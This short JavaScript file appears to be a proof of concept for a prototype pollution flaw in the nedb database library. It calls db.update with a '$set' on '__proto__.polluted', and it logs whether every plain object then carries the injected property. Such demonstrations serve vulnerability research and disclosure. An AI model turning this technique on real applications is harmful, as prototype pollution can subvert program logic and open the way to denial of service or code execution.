var obj = {};
obj.__proto__.polluted = undefined;
Object.defineProperty(obj, '__proto__', {
    value: obj.__proto__,
    writable: true,
    enumerable: true,
    configurable: true
});
const Datastore = require('nedb');
const db = new Datastore();
console.log({}.polluted);
db.insert({ hello: 'world' }, err => {
    db.update({ hello: 'world' }, { $set: { '__proto__.polluted': 'yes' } }, obj, err => {
        console.log({}.polluted);
    });
});